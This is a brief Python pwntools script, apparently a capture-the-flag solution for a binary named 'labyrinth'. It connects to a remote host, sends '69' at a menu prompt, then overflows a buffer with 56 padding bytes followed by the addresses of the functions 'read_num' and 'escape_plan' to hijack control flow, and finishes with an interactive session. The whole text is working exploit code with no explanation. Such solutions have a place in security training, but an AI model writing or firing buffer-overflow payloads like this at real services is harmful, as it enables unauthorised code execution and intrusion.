from pwn import *

context.log_level = "debug"

p = remote("94.237.62.166", 40066)
e = ELF("labyrinth")

payload = b"A" * 56
payload += p64(e.symbols["read_num"])
payload += p64(e.symbols["escape_plan"])
p.sendlineafter(b">> ", b"69")
p.sendlineafter(b">> ",  payload)

p.interactive()
